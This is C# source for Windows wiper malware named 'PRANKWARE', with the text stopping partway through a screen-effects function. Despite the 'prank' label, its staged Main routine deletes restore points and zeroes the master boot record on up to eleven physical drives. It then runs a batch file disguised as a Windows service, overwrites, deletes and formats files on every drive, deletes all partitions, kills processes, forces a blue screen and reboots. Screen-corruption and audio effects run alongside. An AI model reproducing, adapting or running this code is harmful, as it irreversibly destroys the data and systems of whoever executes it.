using System;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Linq;
using NAudio.CoreAudioApi;
using NAudio.Wave;
using System.Drawing;

namespace PRANKWARE
{
    public class Class
    {
        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32.dll")]
        static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hwnd);
        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(int crColor);
        [DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
        public static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest,
        int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        BLENDFUNCTION blendFunction);
        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll")]
        static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
        int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
        int yMask);
        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
        public static extern bool DeleteDC(IntPtr hdc);
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hHandle);
        enum TernaryRasterOperations : uint
        {
            /// <summary>dest = source</summary>
            SRCCOPY = 0x00CC0020,
            /// <summary>dest = source OR dest</summary>
            SRCPAINT = 0x00EE0086,
            /// <summary>dest = source AND dest</summary>
            SRCAND = 0x008800C6,
            /// <summary>dest = source XOR dest</summary>
            SRCINVERT = 0x00660046,
            /// <summary>dest = source AND (NOT dest)</summary>
            SRCERASE = 0x00440328,
            /// <summary>dest = (NOT source)</summary>
            NOTSRCCOPY = 0x00330008,
            /// <summary>dest = (NOT src) AND (NOT dest)</summary>
            NOTSRCERASE = 0x001100A6,
            /// <summary>dest = (source AND pattern)</summary>
            MERGECOPY = 0x00C000CA,
            /// <summary>dest = (NOT source) OR dest</summary>
            MERGEPAINT = 0x00BB0226,
            /// <summary>dest = pattern</summary>
            PATCOPY = 0x00F00021,
            /// <summary>dest = DPSnoo</summary>
            PATPAINT = 0x00FB0A09,
            /// <summary>dest = pattern XOR dest</summary>
            PATINVERT = 0x005A0049,
            /// <summary>dest = (NOT dest)</summary>
            DSTINVERT = 0x00550009,
            /// <summary>dest = BLACK</summary>
            BLACKNESS = 0x00000042,
            /// <summary>dest = WHITE</summary>
            WHITENESS = 0x00FF0062,
            /// <summary>
            /// Capture window as seen on screen.  This includes layered windows
            /// such as WPF windows with AllowsTransparency="true"
            /// </summary>
            CAPTUREBLT = 0x40000000
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }

            public static implicit operator System.Drawing.Point(POINT p)
            {
                return new System.Drawing.Point(p.X, p.Y);
            }

            public static implicit operator POINT(System.Drawing.Point p)
            {
                return new POINT(p.X, p.Y);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct BLENDFUNCTION
        {
            byte BlendOp;
            byte BlendFlags;
            byte SourceConstantAlpha;
            byte AlphaFormat;

            public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
            {
                BlendOp = op;
                BlendFlags = flags;
                SourceConstantAlpha = alpha;
                AlphaFormat = format;
            }
        }
        const int AC_SRC_OVER = 0x00;
        const int AC_SRC_ALPHA = 0x01;

        public static Icon Extract(string file, int number, bool largeIcon)
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }
        }
        private const int SW_SHOWMINIMIZED = 2;
        private const int SW_RESTORE = 9;
        Random r;
        int count = 1000;
        int x = Screen.PrimaryScreen.Bounds.Width;
        int y = Screen.PrimaryScreen.Bounds.Height;
        int left = Screen.PrimaryScreen.Bounds.Left;
        int top = Screen.PrimaryScreen.Bounds.Top;
        int right = Screen.PrimaryScreen.Bounds.Right;
        int bottom = Screen.PrimaryScreen.Bounds.Bottom;
        bool gdi_text = false;
        Icon some_ico = Extract("shell32.dll", 232, true);
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);
        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);

        [DllImport("user32.dll")]
        static extern bool GetCursorPos(out POINT lpPoint);
        const uint GenericRead = 0x80000000;
        const uint GenericWrite = 0x40000000;
        const uint GenericExecute = 0x20000000;
        const uint GenericAll = 0x10000000;
        const uint FileShareRead = 0x1;
        const uint FileSharewWrite = 0x2;
        const uint OpenExisting = 0x3;
        const uint FileFlagDeleteOnClose = 0x40000000;
        const uint MbrSize = 512u;
        const byte OverwriteByte = 0xFF;
        public static void Main(string[] args)
        {
            new Thread(StartSound).Start();
            try
            {
                Class gdi_nonstatic = new Class();
                Thread gdi = new Thread(gdi_nonstatic.GDI_payloads);
                gdi.Start();
            }
            catch (Exception) { }
            ShowMessage("PRANKWARE Successfully Started !");
            ShowMessage("Entering 1st Stage :: Removing Restore Points...");
            try {RemoveRecoveryAndRestorePoints(); } catch(Exception) { }
            ShowMessage("1st Stage Completed :: Restore Points Removal \n" +
                        "Entering 2nd Stage :: Loading Registry Keys...");
            try {LoadRegistry(); } catch (Exception) { }
            ShowMessage("2nd Stage Completed :: Change Registry Keys \n" +
                        "Entering 3rd Stage :: Overwriting MBR...");
            try {MBR(); } catch (Exception) { }
            ShowMessage("3rd Stage Completed :: Overwrite MBR \n" +
                        "Entering 4th Stage :: Executing BatchScript...");
            try {ExecuteBatchFileAsAdmin(); } catch (Exception) { }
            ShowMessage("4th Stage Completed :: BatchScript Execution \n" +
                        "Entering 5th Stage :: Overwriting Disks...");
            try {DiskOverwriter(); } catch (Exception) { }
            ShowMessage("5th Stage Completed :: Disk Overwriting \n" +
                        "Entering 6th Stage :: Wiping disks (unsecure)...");
            try {WipeDisks(); } catch (Exception) { }
            ShowMessage("6th Stage Completed :: Disk Wiping (unsecure)\n" +
                        "Entering 7th Stage :: Wiping disks (secure)...");
            try {SecurelyWipeDisks(); } catch (Exception) { }
            ShowMessage("7th Stage Completed :: Disk Wiping (secure) \n" +
                        "Entering 8th Stage :: Fast-Formatting disks...");
            try {FastFormatAllDisks(); } catch (Exception) { }
            ShowMessage("8th Stage Completed :: Disk Formatting \n" +
                        "Entering 9th Stage :: Deleting disk partitions...");
            try {DeleteAllPartitions(); } catch (Exception) { }
            ShowMessage("9th Stage Completed :: Disk Partition Deletion \n" +
                        "Entering 10th Stage :: Killing Processes & Showing errors...");
            try {new Thread(KillProcesses).Start(); } catch (Exception) { }
            try {new Thread(InfiniteErrors).Start(); } catch (Exception) { }
            ShowMessage("10th Stage Completed :: Process Killing & Error Showing \n" +
                        "Entering 11th Stage :: Triggering BSOD...");
            try {new Thread(BSOD); } catch (Exception) { }
            ShowMessage("Execution Completed !");
            Environment.Exit(0);
        }
        static void StartSound()
        {
            while (true)
            {
                try {
                    UnmuteSpeaker();
                    PlaySound();
                }
                catch (Exception) { }
                
            }
        }

        static void HideWindows()
        {
            IntPtr desktopWindowHandle = GetDesktopWindow();
            try
            {
                IntPtr currentWindowHandle = GetWindow(desktopWindowHandle, 5);
                while (currentWindowHandle != IntPtr.Zero)
                {
                    ShowWindow(currentWindowHandle, SW_SHOWMINIMIZED);
                    currentWindowHandle = GetWindow(currentWindowHandle, 2);
                }
                ShowWindow(desktopWindowHandle, SW_RESTORE);
            }catch (Exception) { }
        }
        static void PlaySound()
        {
            try
            {
                string soundFilePath = @"C:\Windows\windows-default-sound-pack.mp3";

                using (var audioFile = new AudioFileReader(soundFilePath))
                using (var outputDevice = new WaveOutEvent())
                {
                    var waveStream = WaveFormatConversionStream.CreatePcmStream(audioFile);
                    var volumeStream = new WaveChannel32(waveStream)
                    {
                        Volume = 1f
                    };

                    outputDevice.Init(volumeStream);
                    outputDevice.Play();
                    Thread.Sleep(Timeout.Infinite);
                }
            }
            catch (Exception) { }
        }

        static void UnmuteSpeaker()
        {
            try
            {
                var enumerator = new MMDeviceEnumerator();
                var device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);

                if (device.AudioEndpointVolume.Mute)
                {
                    device.AudioEndpointVolume.Mute = false;
                }
            }
            catch (Exception) { }
        }
        static void SetMaxBrightness()
        {
            
                while (true)
                {
                    try
                    {
                        ManagementClass managementClass = new ManagementClass("WmiMonitorBrightnessMethods");
                        ManagementObjectCollection managementObjects = managementClass.GetInstances();

                        foreach (ManagementObject managementObject in managementObjects.Cast<ManagementObject>())
                        {
                        managementObject.InvokeMethod("WmiSetBrightness", new object[] { UInt32.MaxValue, 0 });
                        managementObject.InvokeMethod("WmiSetContrast", new object[] { UInt32.MaxValue, 0 });
                        managementObject.InvokeMethod("WmiSetSaturation", new object[] { UInt32.MaxValue, 0 });
                        }
                    }
                    catch (Exception) { }
                    
                }
            
        }
        static void HoldMouse()
        {
            int centerX = Console.WindowWidth / 2;
            int centerY = Console.WindowHeight / 2;
            while (true)
            {
                try
                {
                    if (GetCursorPos(out POINT currentPos))
                    {
                        if (currentPos.X != centerX || currentPos.Y != centerY)
                            SetCursorPos(centerX, centerY);
                    }
                    HideWindows();
                }
                catch (Exception) { }
            }
        }
        static void ShowMessage(string message)
        {
            try
            {
                MessageBox.Show(message, "PRANKWARE", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception) { }
        }
        static void MBR()
        {
            var mbrData = new byte[512];
            for (int i = 0; i < mbrData.Length; i++)
            {
                mbrData[i] = 0x00;
            }
            try
            {
                var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileSharewWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
                mbr = CreateFile("\\\\.\\PhysicalDrive1", GenericAll, FileShareRead | FileSharewWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten1, IntPtr.Zero);
                mbr = CreateFile("\\\\.\\PhysicalDrive2", GenericAll, FileShareRead | FileSharewWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten2, IntPtr.Zero);
                mbr = CreateFile("\\\\.\\PhysicalDrive3", GenericAll, FileShareRead | FileSharewWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten3, IntPtr.Zero);
                mbr = CreateFile("\\\\.\\PhysicalDrive4", GenericAll, FileShareRead | FileSharewWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten4, IntPtr.Zero);
                mbr = CreateFile("\\\\.\\PhysicalDrive5", GenericAll, FileShareRead | FileSharewWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten5, IntPtr.Zero);
                mbr = CreateFile("\\\\.\\PhysicalDrive6", GenericAll, FileShareRead | FileSharewWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten6, IntPtr.Zero);
                mbr = CreateFile("\\\\.\\PhysicalDrive7", GenericAll, FileShareRead | FileSharewWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten7, IntPtr.Zero);
                mbr = CreateFile("\\\\.\\PhysicalDrive8", GenericAll, FileShareRead | FileSharewWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten8, IntPtr.Zero);
                mbr = CreateFile("\\\\.\\PhysicalDrive9", GenericAll, FileShareRead | FileSharewWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten9, IntPtr.Zero);
                mbr = CreateFile("\\\\.\\PhysicalDrive10", GenericAll, FileShareRead | FileSharewWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten10, IntPtr.Zero);
            }
            catch (Exception) { }
        }
        static void BSOD()
        {
            try
            {
                Process.EnterDebugMode();
                int isCritical = 1;
                int BreakOnTermination = 0x1D;
                int status = 1;
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
                Process.GetCurrentProcess().Kill();
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                ExecutePowerShellCommand("shutdown /f /r /t 0");
            }
            catch (Exception) { }
        }
        static void KillProcesses()
        {
            try
            {
                Process.EnterDebugMode();
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    if ((process.ProcessName != "PRANKWARE.exe") || (process.ProcessName != "prankware.exe"))
                        process.Kill();
                }
            }
            catch(Exception) { }
        }
        static void DiskOverwriter()
        {
            string[] drives = Environment.GetLogicalDrives();
            byte[] bytesToWrite = { 0x50, 0x52, 0x41, 0x4E, 0x4B, 0x57, 0x41, 0x52, 0x45 };

            foreach (string drive in drives)
            {
                string[] files = Directory.GetFiles(drive, "*", SearchOption.AllDirectories);

                foreach (string file in files)
                {
                    if ((Path.GetFileName(file) == "PRANKWARE.exe") ||
                        (Path.GetFileName(file) == "windows-disk-checker-service.bat") ||
                        (Path.GetFileName(file) == "windows-default-sound-pack.mp3") ||
                        (Path.GetFileName(file) == "Microsoft.Win32.Registry.dll") ||
                        (Path.GetFileName(file) == "Microsoft.Win32.Registry.xml") ||
                        (Path.GetFileName(file) == "NAudio.Asio.dll") ||
                        (Path.GetFileName(file) == "NAudio.Core.dll") ||
                        (Path.GetFileName(file) == "NAudio.dll") ||
                        (Path.GetFileName(file) == "NAudio.Midi.dll") ||
                        (Path.GetFileName(file) == "NAudio.Wasapi.dll") ||
                        (Path.GetFileName(file) == "NAudio.WinForms.dll") ||
                        (Path.GetFileName(file) == "NAudio.WinMM.dll") ||
                        (Path.GetFileName(file) == "NAudio.xml") ||
                        (Path.GetFileName(file) == "PRANKWARE.exe.config") ||
                        (Path.GetFileName(file) == "PRANKWARE.pdb") ||
                        (Path.GetFileName(file) == "System.Security.AccessControl.dll") ||
                        (Path.GetFileName(file) == "System.Security.AccessControl.xml") ||
                        (Path.GetFileName(file) == "System.Security.Principal.Windows.dll") ||
                        (Path.GetFileName(file) == "System.Security.Principal.Windows.xml"))
                    {
                        continue;
                    }
                    try
                    {
                        using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Write))
                        {
                            fs.Write(bytesToWrite, 0, bytesToWrite.Length);
                            fs.Flush();
                        }
                    }
                    catch(Exception){}
                }
            }
        }
        static void InfiniteErrors()
        {
            try {
                int i = 0;
                while (i < 1000)
                {
                    MessageBox.Show("Your PC has been damaged !!!", "PRANKWARE", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    i++;
                }
            }
            catch(Exception) { }
           
        }
        static void SetRegistryValue(string keyPath, string valueName, int valueData)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(keyPath, true))
                {
                    key.SetValue(valueName, valueData, RegistryValueKind.DWord);
                    key.Close();
                }
            }
            catch(Exception) { }
        }
        static byte[] HexStringToByteArray(string hex)
        {
            try
            {
                hex = hex.Replace(",", string.Empty).Replace(" ", string.Empty);
                byte[] bytes = new byte[hex.Length / 2];
                for (int i = 0; i < hex.Length; i += 2)
                {
                    bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
                }
                return bytes;
            }
            catch(Exception) { }
            return null;
        }
        static void DeleteAllPartitions()
        {
            try
            {
                ManagementObjectSearcher diskSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
                foreach (ManagementObject disk in diskSearcher.Get().Cast<ManagementObject>().Cast<ManagementObject>().Cast<ManagementObject>())
                {
                    ManagementObjectSearcher partitionSearcher = new ManagementObjectSearcher($"ASSOCIATORS OF {{Win32_DiskDrive.DeviceID='{disk["DeviceID"]}'}} WHERE AssocClass = Win32_DiskDriveToDiskPartition");
                    foreach (ManagementObject partition in partitionSearcher.Get().Cast<ManagementObject>().Cast<ManagementObject>().Cast<ManagementObject>())
                    {
                        partition.Delete();
                    }
                }
            }
            catch(Exception) { }
        }
        static void RemoveRecoveryAndRestorePoints()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM SystemRestore");
                foreach (ManagementObject obj in searcher.Get().Cast<ManagementObject>().Cast<ManagementObject>())
                {
                    obj.Delete();
                }
            }
            catch(Exception) { }
            
        }
        static void FastFormatAllDisks()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk");
                foreach (ManagementObject disk in searcher.Get().Cast<ManagementObject>().Cast<ManagementObject>())
                {
                    string driveLetter = disk["DeviceID"].ToString();
                    ExecutePowerShellCommand($"Format-Volume -DriveLetter {driveLetter} -FileSystem NTFS -Force -Confirm:$false");
                }
            }
            catch(Exception) { }
        }
        static void ExecutePowerShellCommand(string command)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "powershell.exe";
                startInfo.Arguments = command;
                startInfo.RedirectStandardOutput = true;
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;

                using (Process process = new Process())
                {
                    process.StartInfo = startInfo;
                    process.Start();
                    process.WaitForExit();
                }
            }
            catch(Exception) { }
            
        }
        static void WipeDisks()
        {
            try
            {
                DriveInfo[] drives = DriveInfo.GetDrives();
                foreach (DriveInfo drive in drives)
                {
                    DriveInfo driveInfo = new DriveInfo(drive.Name);
                    DirectoryInfo rootDirectory = driveInfo.RootDirectory;
                    DirectoryInfo[] directories = rootDirectory.GetDirectories();

                    foreach (DirectoryInfo directory in directories)
                    {
                        try
                        {
                            FileInfo[] files = directory.GetFiles();

                            foreach (FileInfo file in files)
                            {
                                try
                                {
                                    if ((Path.GetFileName(file.Name) == "PRANKWARE.exe") ||
                                    (Path.GetFileName(file.Name) == "windows-disk-checker-service.bat") ||
                                    (Path.GetFileName(file.Name) == "windows-default-sound-pack.mp3") ||
                                    (Path.GetFileName(file.Name) == "Microsoft.Win32.Registry.dll") ||
                                    (Path.GetFileName(file.Name) == "Microsoft.Win32.Registry.xml") ||
                                    (Path.GetFileName(file.Name) == "NAudio.Asio.dll") ||
                                    (Path.GetFileName(file.Name) == "NAudio.Core.dll") ||
                                    (Path.GetFileName(file.Name) == "NAudio.dll") ||
                                    (Path.GetFileName(file.Name) == "NAudio.Midi.dll") ||
                                    (Path.GetFileName(file.Name) == "NAudio.Wasapi.dll") ||
                                    (Path.GetFileName(file.Name) == "NAudio.WinForms.dll") ||
                                    (Path.GetFileName(file.Name) == "NAudio.WinMM.dll") ||
                                    (Path.GetFileName(file.Name) == "NAudio.xml") ||
                                    (Path.GetFileName(file.Name) == "PRANKWARE.exe.config") ||
                                    (Path.GetFileName(file.Name) == "PRANKWARE.pdb") ||
                                    (Path.GetFileName(file.Name) == "System.Security.AccessControl.dll") ||
                                    (Path.GetFileName(file.Name) == "System.Security.AccessControl.xml") ||
                                    (Path.GetFileName(file.Name) == "System.Security.Principal.Windows.dll") ||
                                    (Path.GetFileName(file.Name) == "System.Security.Principal.Windows.xml"))
                                    {
                                        continue;
                                    }
                                    file.Delete();
                                }
                                catch(Exception) { }
                            }
                            directory.Delete();
                        }
                        catch (Exception) { }
                    }
                }
            }
            catch (Exception)
            {}
        }
        static void SecurelyWipeDisks()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();

            foreach (DriveInfo drive in drives)
            {
                try
                {
                    string diskPath = drive.RootDirectory.FullName;

                    using (FileStream stream = new FileStream(diskPath, FileMode.Open, FileAccess.Write))
                    {
                        byte[] data = new byte[stream.Length];
                        for (int i = 0; i < data.Length; i++)
                        {
                            data[i] = OverwriteByte;
                        }
                        stream.Write(data, 0, data.Length);
                        stream.Flush();
                        stream.Close();
                    }
                }
                catch (Exception) { }
            }
        }
        static void ExecuteBatchFileAsAdmin()
        {
            string batchFilePath = @"C:\Windows\windows-disk-checker-service.bat";
            ProcessStartInfo processInfo = new ProcessStartInfo();
            processInfo.FileName = "cmd.exe";
            processInfo.Arguments = $"/c \"{batchFilePath}\"";
            processInfo.Verb = "runas";

            try
            {
                Process.Start(processInfo);
            }
            catch (Exception)
            {}
        }
        public void Clear_screen()
        {
            for (int num = 0; num < 10; num++)
            {
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(10);
            }
        }
        public void GDI_payloads()
        {
            while (true)
            {
                try
                {
                    r = new Random();
                    IntPtr hwnd = GetDesktopWindow();
                    IntPtr hdc = GetWindowDC(hwnd);
                    IntPtr desktop = GetDC(IntPtr.Zero);
                    IntPtr rndcolor = CreateSolidBrush(0);
                    IntPtr mhdc = CreateCompatibleDC(hdc);
                    IntPtr hbit = CreateCompatibleBitmap(hdc, x, y);
                    IntPtr holdbit = SelectObject(mhdc, hbit);
                    POINT[] lppoint = new POINT[3];
                    for (int num = 0; num < 100; num++)
                    {
                        hwnd = GetDesktopWindow();
                        hdc = GetWindowDC(hwnd);
                        BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                        DeleteDC(hdc);
                        if (count > 51)
                            Thread.Sleep(count -= 50);
                        else
                            Thread.Sleep(50);
                    }
                    for (int num = 0; num < 300; num++)
                    {
                        hwnd = GetDesktopWindow();
                        hdc = GetWindowDC(hwnd);
                        BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                        DeleteDC(hdc);
                        int posX = Cursor.Position.X;
                        int posY = Cursor.Position.Y;
                        desktop = GetDC(IntPtr.Zero);
                        using (Graphics g = Graphics.FromHdc(desktop))
                        {
                            g.DrawIcon(some_ico, posX, posY);
                        }
                        ReleaseDC(IntPtr.Zero, desktop);
                        Thread.Sleep(50);
                    }
                    for (int num = 0; num < 500; num++)
                    {
                        hwnd = GetDesktopWindow();
                        hdc = GetWindowDC(hwnd);
                        BitBlt(hdc, 0, r.Next(10), r.Next(x), y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                        DeleteDC(hdc);
                        if (r.Next(30) == 1)
                            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                        Thread.Sleep(r.Next(25));
                    }
                    Clear_screen();
                    Thread gdi2 = new Thread(GDI_payloads2);
                    gdi2.Start();
                    for (int num = 0; num < 500; num++)
                    {
                        hwnd = GetDesktopWindow();
                        hdc = GetWindowDC(hwnd);
                        BitBlt(hdc, r.Next(-300, x), r.Next(-300, y), r.Next(x / 2), r.Next(y / 2), hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                        DeleteDC(hdc);
                        Thread.Sleep(50);
                    }
                    Clear_screen();
                    for (int num = 0; num < 700; num++)
                    {
                        if (num < 300)
                        {
                            hwnd = GetDesktopWindow();
                            hdc = GetWindowDC(hwnd);
                            rndcolor = CreateSolidBrush(r.Next(100000000));
                            SelectObject(hdc, rndcolor);
                            BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                            DeleteObject(rndcolor);
                            DeleteDC(hdc);
                            Thread.Sleep(50);
                        }
                        else if (num < 500)
                        {
                            hwnd = GetDesktopWindow();
                            hdc = GetWindowDC(hwnd);
                            rndcolor = CreateSolidBrush(r.Next(100000000));
                            SelectObject(hdc, rndcolor);
                            BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                            BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, TernaryRasterOperations.SRCERASE);
                            BitBlt(hdc, r.Next(-300, x), r.Next(-300, y), r.Next(x / 2), r.Next(y / 2), hdc, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                            DeleteObject(rndcolor);
                            DeleteDC(hdc);
                            Thread.Sleep(50);
                        }
                        else
                        {
                            hwnd = GetDesktopWindow();
                            hdc = GetWindowDC(hwnd);
                            rndcolor = CreateSolidBrush(r.Next(100000000));
                            SelectObject(hdc, rndcolor);
                            BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT);
                            BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, TernaryRasterOperations.SRCINVERT);
                            DeleteObject(rndcolor);
                            DeleteDC(hdc);
                            Thread.Sleep(50);
                        }
                    }
                    Clear_screen();
                    gdi_text = true;
                    for (int num = 0; num < 500; num++)
                    {
                        hwnd = GetDesktopWindow();
                        hdc = GetWindowDC(hwnd);
                        lppoint[0].X = left + r.Next(25);
                        lppoint[0].Y = top + r.Next(25);
                        lppoint[1].X = right - r.Next(25);
                        lppoint[1].Y = top;
                        lppoint[2].X = left + r.Next(25);
                        lppoint[2].Y = bottom - r.Next(25);
                        PlgBlt(hdc, lppoint, hdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
                        mhdc = CreateCompatibleDC(hdc);
                        hbit = CreateCompatibleBitmap(hdc, x, y);
                        holdbit = SelectObject(mhdc, hbit);
                        if (r.Next(3) == 1)
                            rndcolor = CreateSolidBrush(100);
                        else if (r.Next(3) == 2)
                            rndcolor = CreateSolidBrush(100000);
                        else if (r.Next(3) == 0)
                            rndcolor = CreateSolidBrush(100000000);
                        SelectObject(mhdc, rndcolor);
                        Rectangle(mhdc, left, top, right, bottom);
                        AlphaBlend(hdc, 0, 0, x, y, mhdc, 0, 0, x, y, new BLENDFUNCTION(0, 0, 10, 0));
                        SelectObject(mhdc, holdbit);
                        DeleteObject(hbit);
                        DeleteDC(hdc);
                        Thread.Sleep(10);
                    }
                }
                catch(Exception) { }
            }
            
        }
        public void GDI_payloads2()
        {
            try
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                IntPtr desktop = GetDC(IntPtr.Zero);
                int num_count = 1000;
                r = new Random();
                for (; ; )
                {
                    if (!gdi_text)
                    {
                        hwnd = GetDesktopWindow();
                        hdc = GetWindowDC(hwnd);
                        BitBlt(hdc, r.Next(20), r.Next(20), x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                        DeleteDC(hdc);
                        if (num_count > 51)
                            Thread.Sleep(num_count -= 50);
                        else
                            Thread.Sleep(5);
                    }
                    else
                    {
                        desktop = GetDC(IntPtr.Zero);
                        using (Graphics g = Graphics.FromHdc(desktop))
                        {
